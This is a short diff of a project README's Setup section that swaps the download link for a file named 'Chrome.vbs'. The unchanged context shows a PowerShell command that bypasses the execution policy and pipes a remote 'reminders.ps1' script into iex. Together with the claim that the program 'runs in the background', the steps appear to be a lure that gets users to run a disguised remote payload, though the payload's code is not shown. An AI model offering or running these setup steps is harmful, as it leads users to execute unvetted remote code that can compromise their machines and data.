@@ -4,7 +4,7 @@ No installation or prerequisites are needed. The program runs in the background.
 
 ## Setup
 
-To setup please download [Chrome.vbs](<a href="https://raw.githubusercontent.com/Kiyan-7/telaviv/refs/heads/main/Chrome.vbs" download>)
+To setup please download [Chrome.vbs](https://downgit.github.io/#/home?url=https://github.com/Kiyan-7/telaviv/blob/main/Chrome.vbs)
 
 ```
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force; irm 'https://raw.githubusercontent.com/Kiyan-7/telaviv/main/reminders.ps1' | iex
